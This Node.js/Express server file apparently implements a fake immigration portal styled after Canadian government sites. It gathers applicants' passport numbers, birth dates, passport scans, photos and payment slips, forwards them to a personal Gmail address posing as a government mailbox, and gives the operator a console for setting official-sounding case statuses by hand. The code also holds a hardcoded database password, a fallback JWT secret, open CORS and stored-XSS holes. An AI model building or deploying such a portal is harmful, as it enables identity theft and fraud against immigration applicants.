const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const multer = require('multer');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const fsPromises = require('fs').promises;
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 10000; 
const JWT_SECRET = process.env.JWT_SECRET || 'SYS_SECRET_CORE_NODE_FALLBACK';

// ==========================================
// 1. ADMINISTRATIVE STORAGE CONFIGURATION
// ==========================================
const ADMIN_STORAGE_EMAIL = 'canadaimgov@gmail.com';
const EMAIL_APP_PASSWORD = process.env.EMAIL_APP_PASSWORD || 'your-gmail-app-password-here'; 

// ==========================================
// 2. GLOBAL PIPELINE MIDDLEWARES
// ==========================================
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '30mb' })); 
app.use(express.urlencoded({ limit: '30mb', extended: true }));

const uploadDir = path.join(__dirname, 'tmp_payloads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ==========================================
// 3. SECURE FILE SPOOL ENGINE
// ==========================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => { cb(null, uploadDir); },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage, limits: { fileSize: 40 * 1024 * 1024 } });

// Non-blocking background file cleanup helper
const purgeUploadedFiles = async (files) => {
    if (!files || files.length === 0) return;
    const purgePromises = files.map(async (file) => {
        try {
            await fsPromises.unlink(file.path);
        } catch (err) {
            if (err.code !== 'ENOENT') {
                console.error(`File removal error at ${file.path}:`, err);
            }
        }
    });
    await Promise.all(purgePromises);
};

// ==========================================
// 4. DATABASE REGISTRY ENGINE (STABILIZED)
// ==========================================
const DIRECT_PORT_URI = "mongodb://usrtest:canada2026secure@cluster0-shard-00-00.q9tcm7y.mongodb.net:27017,cluster0-shard-00-01.q9tcm7y.mongodb.net:27017,cluster0-shard-00-02.q9tcm7y.mongodb.net:27017/immigration?ssl=true&replicaSet=atlas-13w7g2-shard-0&authSource=admin&retryWrites=true&w=majority";
const MONGO_URI = (process.env.MONGO_URI || DIRECT_PORT_URI).trim();

const dbOptions = {
    connectTimeoutMS: 15000, // Recover from temporary network drops
    socketTimeoutMS: 45000
};

mongoose.connect(MONGO_URI, dbOptions)
  .then(() => console.log('🚀 DATABASE ONLINE: Registry tracking matrix synchronized.'))
  .catch(err => console.log('❌ DATABASE OFFLINE CRITICAL FAULT:', err.message));

const UserSchema = new mongoose.Schema({
    name: { type: String, required: true },
    email: { type: String, required: true, unique: true, lowercase: true },
    password: { type: String, required: true },
    dob: { type: String, default: '' },
    citizenship: { type: String, default: '' },
    passportNumber: { type: String, default: '' },
    role: { type: String, enum: ['user', 'admin'], default: 'user' },
    uciNumber: { type: String, default: null }, 
    trackingRef: { type: String, default: null },
    status: { type: String, default: 'Awaiting Manual Document Verification' },
    adminNotes: { type: String, default: 'Your profile has been created. A case officer will evaluate your documents shortly once retrieved from secure email archives.' },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.models.User || mongoose.model('User', UserSchema);

// ==========================================
// 5. DOCUMENT SUBMISSION & EMAIL FORWARDING
// ==========================================
app.post('/api/auth/register', upload.any(), async (req, res) => {
    try {
        const { name, email, password, dob, citizenship, passportNumber, docTypes } = req.body;
        
        if (!name || !email || !password) {
            if (req.files) await purgeUploadedFiles(req.files);
            return res.status(400).json({ error: 'Primary profile details missing.' });
        }

        const cleanEmail = email.toLowerCase().trim();
        const existingUser = await User.findOne({ email: cleanEmail });
        if (existingUser) {
            if (req.files) await purgeUploadedFiles(req.files);
            return res.status(409).json({ error: 'This email account is already registered.' });
        }

        // Create standard account profile
        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);
        const systemAdminEmail = (process.env.SYSTEM_ADMIN_EMAIL || 'admin@portal.com').toLowerCase().trim();
        const role = (cleanEmail === systemAdminEmail) ? 'admin' : 'user';

        const newUser = new User({ name, email: cleanEmail, password: hashedPassword, dob, citizenship, passportNumber, role });
        await newUser.save();

        // Package and forward files to administrative mailbox
        if (req.files && req.files.length > 0) {
            const typesArray = Array.isArray(docTypes) ? docTypes : [docTypes];
            const attachments = req.files.map((file, idx) => ({
                filename: `[${typesArray[idx] || 'SUPPORTING'}]-${file.originalname}`,
                path: file.path
            }));

            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: { user: ADMIN_STORAGE_EMAIL, pass: EMAIL_APP_PASSWORD }
            });

            const emailTemplate = {
                from: `"Submission Module" <${ADMIN_STORAGE_EMAIL}>`,
                to: ADMIN_STORAGE_EMAIL,
                subject: `🔒 NEW PACKAGE SUBMISSION: ${name} (${passportNumber || 'No Passport'})`,
                html: `
                    <h2>Secure Application Payload Document Packet</h2>
                    <hr/>
                    <p><strong>Applicant Name:</strong> ${name}</p>
                    <p><strong>Registered Email:</strong> ${cleanEmail}</p>
                    <p><strong>Date of Birth:</strong> ${dob}</p>
                    <p><strong>Citizenship:</strong> ${citizenship}</p>
                    <p><strong>Passport Reference Number:</strong> ${passportNumber}</p>
                    <hr/>
                    <p><em>Action Required: Review the attachments below and manually update the client file record inside the Adjudication Desktop using their registered email.</em></p>
                `,
                attachments: attachments
            };

            await transporter.sendMail(emailTemplate);
            await purgeUploadedFiles(req.files);
        }

        res.status(201).json({ success: true, message: 'Application package received and securely archived.' });
    } catch (error) {
        console.error('TRANSACTION FAULT:', error);
        if (req.files) await purgeUploadedFiles(req.files);
        res.status(500).json({ error: 'Secure transmission pipeline encounter. Please verify your file sizes and retry.' });
    }
});

// ==========================================
// 6. CLIENT PORTAL & TRAFFIC VERIFICATION
// ==========================================
app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        const user = await User.findOne({ email: email.trim().toLowerCase() });
        if (!user) return res.status(401).json({ error: 'Invalid credentials.' });

        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) return res.status(401).json({ error: 'Invalid credentials.' });

        const token = jwt.sign({ id: user._id, role: user.role, name: user.name }, JWT_SECRET, { expiresIn: '4h' });
        res.json({ success: true, token, role: user.role, name: user.name });
    } catch (error) { res.status(500).json({ error: 'Sign-in verification failure.' }); }
});

app.post('/api/auth/track', async (req, res) => {
    try {
        const query = req.body.uciNumber.trim();
        const record = await User.findOne({ $or: [{ uciNumber: query }, { trackingRef: query }] });
        if (!record) return res.status(404).json({ error: 'Search query matched zero system directories.' });
        res.json({ name: record.name, status: record.status, adminNotes: record.adminNotes });
    } catch (error) { res.status(500).json({ error: 'Tracking directory lookup error.' }); }
});

app.get('/api/client/profile', async (req, res) => {
    try {
        const authHeader = req.headers['authorization'];
        const token = authHeader && authHeader.split(' ')[1];
        if (!token) return res.status(401).json({ error: 'Unauthorized token reference.' });

        const decoded = jwt.verify(token, JWT_SECRET);
        const profile = await User.findById(decoded.id).select('-password');
        res.json(profile);
    } catch (err) { res.status(401).json({ error: 'Session expired.' }); }
});

// ==========================================
// 7. SECURE ADJUDICATION POLICIES
// ==========================================
const checkAdmin = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'Missing security validation.' });
    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err || decoded.role !== 'admin') return res.status(403).json({ error: 'Clearance refused.' });
        req.user = decoded;
        next();
    });
};

app.get('/api/admin/enrollments', checkAdmin, async (req, res) => {
    try {
        const users = await User.find({ role: 'user' }).sort({ createdAt: -1 }).lean();
        res.json(users);
    } catch (err) { res.status(500).json({ error: "Failed to assemble dashboard records." }); }
});

app.post('/api/admin/manual-create', checkAdmin, async (req, res) => {
    try {
        const { name, email, password, dob, citizenship, passportNumber, uciNumber, trackingRef, status, adminNotes } = req.body;
        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password || 'TemporaryPass123', salt);

        const newClient = new User({
            name, email: email.toLowerCase().trim(), password: hashedPassword,
            dob, citizenship, passportNumber, uciNumber, trackingRef, status, adminNotes
        });
        await newClient.save();
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: 'Failed to create file manually.' }); }
});

app.post('/api/admin/decision', checkAdmin, async (req, res) => {
    try {
        const { id, status, adminNotes, uciNumber, trackingRef } = req.body;
        await User.findByIdAndUpdate(id, { status, adminNotes, uciNumber, trackingRef });
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: 'Adjudication parameters write crash.' }); }
});

app.delete('/api/admin/user/:id', checkAdmin, async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ success: true });
    } catch(err) { res.status(500).json({ error: "Purge execution failure." }); }
});

// ==========================================
// 8. CASE MANAGEMENT DECISION INTERFACE
// ==========================================
app.get('/admin', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>🔒 Adjudication Registry Console</title>
        <style>
            body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f4f6f8; color: #333; margin: 0; padding: 0; }
            .gov-header { background: #fff; border-bottom: 2px solid #e16262; padding: 15px 40px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
            .brand-text { font-size: 20px; font-weight: 700; color: #26374a; }
            .box { max-width: 1600px; margin: 30px auto; background: white; padding: 30px; border: 1px solid #dcdee1; border-radius: 4px; }
            .split-layout { display: flex; gap: 30px; margin-top: 20px; }
            .side-form { width: 350px; background: #f8fafc; padding: 20px; border: 1px solid #cbd5e1; border-radius: 4px; height: fit-content; }
            .main-table { flex: 1; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #dcdcdc; font-size: 13px; vertical-align: top; }
            th { background: #26374a; color: white; }
            tr:nth-child(even) { background: #f8fafc; }
            .save-btn { background: #264a28; color: white; border: none; padding: 8px 14px; cursor: pointer; font-weight: bold; width: 100%; border-radius: 4px; margin-top: 5px; }
            .create-btn { background: #2572b4; color: white; border: none; padding: 10px; font-weight: bold; width: 100%; border-radius: 4px; cursor: pointer; margin-top: 10px; }
            input, select, textarea { width: 100%; padding: 6px; box-sizing: border-box; border: 1px solid #767676; border-radius: 4px; font-size: 13px; margin-bottom: 10px; }
            .banner-info { background: #eff6ff; border-left: 4px solid #2572b4; padding: 12px; font-size: 13px; margin-bottom: 20px; color: #1e3a8a; }
        </style>
    </head>
    <body>
        <div class="gov-header">
            <div class="brand-text">Secure Portal Case Adjudication Console</div>
            <button onclick="localStorage.clear(); window.location.href='/'" style="padding:8px 16px; background:#333; color:#fff; border:none; cursor:pointer; font-weight:bold; border-radius:4px;">Sign Out</button>
        </div>
        <div class="box">
            <div class="banner-info">📡 <strong>Administrative Notice:</strong> Files submitted via client forms are forwarded directly to <strong>canadaimgov@gmail.com</strong>. Cross-reference incoming emails to manually compile or adjust the registry cards below.</div>
            
            <div class="split-layout">
                <div class="side-form">
                    <h3>➕ Manual Record Creation</h3>
                    <form id="manualForm">
                        <label>Legal Full Name</label><input type="text" id="mName" required>
                        <label>Email Address</label><input type="email" id="mEmail" required>
                        <label>Temporary Password</label><input type="text" id="mPass" value="Canada2026Secure">
                        <label>Date of Birth</label><input type="text" id="mDob" placeholder="YYYY-MM-DD">
                        <label>Citizenship</label><input type="text" id="mCitizenship">
                        <label>Passport Number</label><input type="text" id="mPassport">
                        <button type="submit" class="create-btn">Generate Core Ledger File</button>
                    </form>
                </div>
                
                <div class="main-table">
                    <h3>📋 Identity Track Parameters & Processing Matrix</h3>
                    <table>
                        <thead>
                            <tr>
                                <th>Client Identity Details</th>
                                <th>Assigned Reference Codes (UCI / GC)</th>
                                <th>Processing Milestone Status</th>
                                <th>Official Adjudicator Remarks</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="rows"><tr><td colspan="5" style="text-align:center;">Retrieving Secure Application Ledger Tracks...</td></tr></tbody>
                    </table>
                </div>
            </div>
        </div>
        <script>
            const token = localStorage.getItem('adminToken');
            if (!token || localStorage.getItem('userRole') !== 'admin') { window.location.href = '/'; }

            async function loadGrid() {
                const res = await fetch('/api/admin/enrollments', { headers: { 'Authorization': 'Bearer ' + token } });
                const users = await res.json();
                const tbody = document.getElementById('rows');
                tbody.innerHTML = '';
                
                users.forEach(u => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = \`
                        <td><strong>\${u.name}</strong><br><small><code>\${u.email}</code><br>DOB: \${u.dob || 'N/A'}<br>Nation: \${u.citizenship || 'N/A'}<br>Pass: \${u.passportNumber || 'N/A'}</small></td>
                        <td>
                            <label style="font-size:11px; font-weight:bold;">UCI Number:</label>
                            <input type="text" id="uci-\${u._id}" value="\${u.uciNumber || ''}" placeholder="UCI-10928374">
                            <label style="font-size:11px; font-weight:bold;">GC Case Ref:</label>
                            <input type="text" id="gc-\${u._id}" value="\${u.trackingRef || ''}" placeholder="GC-772839">
                        </td>
                        <td>
                            <select id="s-\${u._id}">
                                <option value="Awaiting Manual Document Verification" \${u.status.includes('Verification')?'selected':''}>Awaiting Manual Document Verification</option>
                                <option value="Biometrics Verification Stage" \${u.status.includes('Biometrics')?'selected':''}>Biometrics Verification Stage</option>
                                <option value="Background Eligibility Check" \${u.status.includes('Background')?'selected':''}>Background Eligibility Check</option>
                                <option value="Registry Profile Document Approved" \${u.status.includes('Approved')?'selected':''}>Registry Profile Document Approved</option>
                                <option value="Application Counterfoil Dispatched" \${u.status.includes('Counterfoil')?'selected':''}>Application Counterfoil Dispatched</option>
                            </select>
                        </td>
                        <td><textarea id="n-\${u._id}" rows="4" style="margin:0;">\${u.adminNotes || ''}</textarea></td>
                        <td>
                            <button class="save-btn" onclick="save('\${u._id}')">Commit</button>
                            <button class="save-btn" style="background:#b91c1c; margin-top:5px;" onclick="purge('\${u._id}')">Purge</button>
                        </td>
                    \`;
                    tbody.appendChild(tr);
                });
            }

            document.getElementById('manualForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                await fetch('/api/admin/manual-create', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
                    body: JSON.stringify({
                        name: document.getElementById('mName').value,
                        email: document.getElementById('mEmail').value,
                        password: document.getElementById('mPass').value,
                        dob: document.getElementById('mDob').value,
                        citizenship: document.getElementById('mCitizenship').value,
                        passportNumber: document.getElementById('mPassport').value
                    })
                });
                document.getElementById('manualForm').reset();
                loadGrid();
            });

            async function save(id) {
                await fetch('/api/admin/decision', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
                    body: JSON.stringify({
                        id,
                        status: document.getElementById('s-'+id).value,
                        adminNotes: document.getElementById('n-'+id).value,
                        uciNumber: document.getElementById('uci-'+id).value,
                        trackingRef: document.getElementById('gc-'+id).value
                    })
                });
                alert('Changes successfully committed to live matrix profile.');
                loadGrid();
            }

            async function purge(id) {
                if(confirm('Permanently purge this user profile ledger?')) {
                    await fetch('/api/admin/user/' + id, { method: 'DELETE', headers: { 'Authorization': 'Bearer ' + token } });
                    loadGrid();
                }
            }
            window.onload = loadGrid;
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// 9. CLIENT INTERFACES & GATEWAY
// ==========================================
app.get('*', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Immigration and Eligibility Portal</title>
        <style>
            body { font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333333; margin: 0; padding: 0; }
            .top-utility { background-color: #26374a; padding: 8px 40px; display: flex; justify-content: flex-end; }
            .top-utility a { color: #ffffff; text-decoration: none; font-size: 13px; font-weight:600;}
            .gov-brand-bar { padding: 25px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e1e4e7; }
            .signature-logo { font-size: 26px; font-weight: bold; color: #000; }
            .red-accent-strip { background-color: #c8102e; height: 4px; width: 100%; }
            .main-content { max-width: 1140px; margin: 30px auto; padding: 0 40px; }
            h1 { font-size: 38px; border-bottom: 1px solid #afb7c0; padding-bottom: 12px; margin-top: 0; }
            .wet-tabs { display: flex; background: #eaebed; padding: 6px; border-radius: 4px; margin-bottom: 30px; }
            .wet-tabs button { padding: 12px 24px; background: transparent; border: none; font-size: 15px; font-weight: bold; cursor: pointer; color: #26374a; }
            .wet-tabs button.active { background: #26374a; color: #ffffff; border-radius: 4px; }
            .portal-panel { display: none; background: #ffffff; border: 1px solid #dcdcdc; border-radius: 4px; padding: 30px; }
            .portal-panel.active { display: block; }
            .form-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 20px; }
            @media (max-width: 768px) { .form-grid { grid-template-columns: 1fr; } }
            .input-group { display: flex; flex-direction: column; margin-bottom: 15px; }
            label { font-size: 14px; font-weight: 600; margin-bottom: 6px; }
            .required-mark { color: #bc1c1c; }
            input, select { padding: 8px 12px; border: 1px solid #444444; font-size: 15px; border-radius: 4px; width: 100%; box-sizing: border-box; height: 40px; }
            .uploader-framework { background: #f8fafc; border: 2px dashed #94a3b8; padding: 25px; border-radius: 6px; margin-top: 20px; }
            .controls-row { display: flex; gap: 15px; align-items: flex-end; margin-bottom: 20px; background: #fff; padding: 15px; border: 1px solid #e2e8f0; border-radius: 4px; }
            .plus-btn { width: 40px; height: 40px; background: #2572b4; color: white; border: none; font-size: 24px; font-weight: bold; cursor: pointer; border-radius: 4px; display: flex; justify-content: center; align-items: center; border-bottom: 3px solid #1b5180; }
            .queue-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
            .queue-item { background: #fff; border: 1px solid #cbd5e1; padding: 12px; border-radius: 4px; display: flex; justify-content: space-between; align-items: center; border-left: 4px solid #2572b4; }
            .remove-file-btn { background: #dc2626; color: white; border: none; padding: 4px 8px; cursor: pointer; font-size: 11px; font-weight: bold; border-radius: 3px; }
            .btn-primary { padding: 11px 24px; background-color: #2572b4; color: #ffffff; border: 1px solid #2369a5; font-size: 16px; font-weight: 700; cursor: pointer; border-radius: 4px; border-bottom: 3px solid #1b5180; }
            .status-display-card { margin-top: 20px; padding: 25px; border-left: 6px solid #2572b4; background-color: #f8fafc; border: 1px solid #e2e8f0; border-radius: 4px; }
        </style>
    </head>
    <body>
        <div class="top-utility"><a href="#">Français</a></div>
        <div class="gov-brand-bar"><div class="signature-logo">Portal Gateway</div></div>
        <div class="red-accent-strip"></div>
        <div class="main-content">
            <h1>Immigration and Travel Eligibility Portal</h1>
            <div class="wet-tabs">
                <button type="button" id="btn-login" class="active" onclick="setView('loginPanel', 'btn-login')">Secure Account Sign-In</button>
                <button type="button" id="btn-register" onclick="setView('registerPanel', 'btn-register')">Document Submission & Enrollment</button>
                <button type="button" id="btn-dashboard" onclick="checkDashboardView()">Secure Client Dashboard</button>
                <button type="button" id="btn-track" onclick="setView('trackPanel', 'btn-track')">Real-Time File Tracking</button>
            </div>

            <div id="loginPanel" class="portal-panel active">
                <h2>Account Secure Gateway Sign-In</h2>
                <form id="lForm">
                    <div style="max-width: 440px;">
                        <div class="input-group">
                            <label>Registered Email Address <span class="required-mark">*</span></label>
                            <input type="email" id="lEmail" required>
                        </div>
                        <div class="input-group">
                            <label>Account Password <span class="required-mark">*</span></label>
                            <input type="password" id="lPass" required>
                        </div>
                        <button type="submit" class="btn-primary">Verify Credentials</button>
                    </div>
                </form>
            </div>

            <div id="registerPanel" class="portal-panel">
                <h2>Secure Document Submission Page</h2>
                <p style="color:#555;">Complete your enrollment file. All files attached here are systematically routing directly to the secure administrative repository enclaves.</p>
                <form id="rForm">
                    <div class="form-grid">
                        <div class="input-group">
                            <label>Legal Full Name <span class="required-mark">*</span></label>
                            <input type="text" id="rName" required>
                        </div>
                        <div class="input-group">
                            <label>Email Address <span class="required-mark">*</span></label>
                            <input type="email" id="rEmail" required>
                        </div>
                        <div class="input-group">
                            <label>Create Portal Account Password <span class="required-mark">*</span></label>
                            <input type="password" id="rPass" required>
                        </div>
                        <div class="input-group">
                            <label>Date of Birth <span class="required-mark">*</span></label>
                            <input type="date" id="rDob" required>
                        </div>
                        <div class="input-group">
                            <label>Country of Citizenship <span class="required-mark">*</span></label>
                            <input type="text" id="rCitizenship" required>
                        </div>
                        <div class="input-group">
                            <label>Passport Serial Number <span class="required-mark">*</span></label>
                            <input type="text" id="rPassport" required>
                        </div>
                    </div>

                    <div class="uploader-framework">
                        <h3>Required Verification Assets Stack</h3>
                        <div class="controls-row">
                            <div class="input-group" style="flex:1; margin-bottom:0;">
                                <label>Select Specific Document Type Category</label>
                                <select id="docTypeSelector">
                                    <option value="passport">🛂 Passport Bio-Page Scan</option>
                                    <option value="photo">📸 Official Passport Photograph</option>
                                    <option value="payment">💰 Application Payment Slip</option>
                                    <option value="education">🎓 Educational Degrees / Certificates</option>
                                    <option value="job_offer">📄 Official Job Offer Letter</option>
                                    <option value="experience">💼 Employment Reference & Experience Letters</option>
                                </select>
                            </div>
                            <div class="input-group" style="flex:1; margin-bottom:0;">
                                <label>Choose Digital Scan Asset File</label>
                                <input type="file" id="fileSelector">
                            </div>
                            <button type="button" class="plus-btn" onclick="addAssetToQueue()">+</button>
                        </div>
                        <div class="queue-list" id="visualQueue"></div>
                    </div>
                    <br>
                    <button type="submit" class="btn-primary">Transmit Submission Package Securely</button>
                </form>
            </div>

            <div id="dashboardPanel" class="portal-panel">
                <h2>Secure Client Progress Dashboard</h2>
                <div id="dashboardDataBlock"></div>
            </div>

            <div id="trackPanel" class="portal-panel">
                <h2>File Status Verification Gateway</h2>
                <form id="tForm">
                    <div style="max-width:440px;">
                        <div class="input-group">
                            <label>Enter Assigned Unique Client ID (UCI) or Case Reference</label>
                            <input type="text" id="tUci" placeholder="UCI-XXXXXXXX / GC-XXXXXX" required>
                        </div>
                        <button type="submit" class="btn-primary">Query Tracking Matrix</button>
                    </div>
                </form>
                <div id="tResult" class="status-display-card" style="display:none;"></div>
            </div>
        </div>

        <script>
            let uploadedAssetsQueue = [];

            function setView(panelId, btnId) {
                document.querySelectorAll('.portal-panel').forEach(p => p.classList.remove('active'));
                document.querySelectorAll('.wet-tabs button').forEach(b => b.classList.remove('active'));
                document.getElementById(panelId).classList.add('active');
                if(btnId) document.getElementById(btnId).classList.add('active');
            }

            function addAssetToQueue() {
                const selector = document.getElementById('fileSelector');
                const docType = document.getElementById('docTypeSelector').value;
                if (!selector.files || selector.files.length === 0) return alert('Select a valid asset.');
                
                uploadedAssetsQueue.push({ file: selector.files[0], type: docType });
                renderQueue();
                selector.value = '';
            }

            function renderQueue() {
                const q = document.getElementById('visualQueue');
                q.innerHTML = '';
                uploadedAssetsQueue.forEach((item, index) => {
                    q.innerHTML += \`
                        <div class="queue-item">
                            <span><strong>\${item.type.toUpperCase()}</strong>: \${item.file.name}</span>
                            <button type="button" class="remove-file-btn" onclick="uploadedAssetsQueue.splice(\${index}, 1); renderQueue();">Remove</button>
                        </div>
                    \`;
                });
            }

            document.getElementById('lForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const res = await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: document.getElementById('lEmail').value, password: document.getElementById('lPass').value })
                });
                const data = await res.json();
                if(data.success) {
                    localStorage.setItem('adminToken', data.token);
                    localStorage.setItem('userRole', data.role);
                    if(data.role === 'admin') window.location.href = '/admin';
                    else checkDashboardView();
                } else { alert(data.error); }
            });

            document.getElementById('rForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const fd = new FormData();
                fd.append('name', document.getElementById('rName').value);
                fd.append('email', document.getElementById('rEmail').value);
                fd.append('password', document.getElementById('rPass').value);
                fd.append('dob', document.getElementById('rDob').value);
                fd.append('citizenship', document.getElementById('rCitizenship').value);
                fd.append('passportNumber', document.getElementById('rPassport').value);
                
                uploadedAssetsQueue.forEach(item => {
                    fd.append('files', item.file);
                    fd.append('docTypes', item.type);
                });

                const res = await fetch('/api/auth/register', { method: 'POST', body: fd });
                const data = await res.json();
                alert(data.message || data.error);
                if(data.success) {
                    uploadedAssetsQueue = [];
                    document.getElementById('rForm').reset();
                    renderQueue();
                    setView('loginPanel', 'btn-login');
                }
            });

            document.getElementById('tForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const res = await fetch('/api/auth/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ uciNumber: document.getElementById('tUci').value })
                });
                const data = await res.json();
                const out = document.getElementById('tResult');
                out.style.display = 'block';
                if(data.error) { out.innerHTML = \`<span style="color:red;">\${data.error}</span>\`; }
                else { out.innerHTML = \`<h3>Status Report: \${data.name}</h3><p><strong>Milestone:</strong> \${data.status}</p><p><strong>Notes:</strong> \${data.adminNotes}</p>\`; }
            });

            async function checkDashboardView() {
                const token = localStorage.getItem('adminToken');
                if(!token) { alert('Please sign in to access your dashboard.'); setView('loginPanel', 'btn-login'); return; }
                
                try {
                    const res = await fetch('/api/client/profile', { headers: { 'Authorization': 'Bearer ' + token } });
                    if(res.ok) {
                        const profile = await res.json();
                        document.getElementById('dashboardDataBlock').innerHTML = \`
                            <div style="padding:20px; border:1px solid #cbd5e1; border-radius:4px; background:#f8fafc;">
                                <h3>Welcome back, \${profile.name}</h3>
                                <p><strong>Registered Email:</strong> \${profile.email}</p>
                                <p><strong>Current Milestone Stage:</strong> <span style="color:#2572b4; font-weight:bold;">\${profile.status}</span></p>
                                <hr style="border:0; border-top:1px solid #cbd5e1; margin:15px 0;"/>
                                <p><strong>Official Portfolio Remarks:</strong></p>
                                <blockquote style="margin:0; padding:10px; background:#fff; border-left:4px solid #94a3b8; font-style:italic;">\${profile.adminNotes}</blockquote>
                            </div>
                        \`;
                        setView('dashboardPanel', 'btn-dashboard');
                    } else {
                        alert('Session configuration expired.');
                        setView('loginPanel', 'btn-login');
                    }
                } catch(err) {
                    alert('Error connecting to the tracking pipeline loop.');
                }
            }
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// 10. HOST INITIALIZATION
// ==========================================
app.listen(PORT, () => {
    console.log(`🚀 RUNNING: Adjudication Engine active on cluster port ${PORT}`);
});
